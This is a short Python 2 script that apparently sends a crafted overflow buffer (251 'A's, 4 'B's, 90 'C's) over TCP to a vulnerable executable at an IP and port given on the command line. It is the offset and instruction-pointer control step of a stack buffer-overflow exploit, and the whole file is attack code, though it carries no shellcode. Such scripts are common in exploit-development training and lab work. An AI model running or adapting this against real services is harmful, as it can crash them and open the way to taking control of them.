#!/usr/bin/python
import time, struct, sys
import socket as so

buffer = "A" * 251 + "B" * 4 + "C" * 90

try:
   server = str(sys.argv[1])
   port = int(sys.argv[2])
except IndexError:
   print "[+] Usage example: python %s 10.10.10.10 1000" % sys.argv[0]
   sys.exit()

s = so.socket(so.AF_INET, so.SOCK_STREAM)   
print "\n[+] Attempting to send buffer overflow to the executeable..."
try:   
   s.connect((server,port))
   s.send(buffer + '\r\n')
   print "\n[+] Completed."
except:
   print "[+] Unable to connect to the executeable. Check your IP address and port"
   sys.exit()
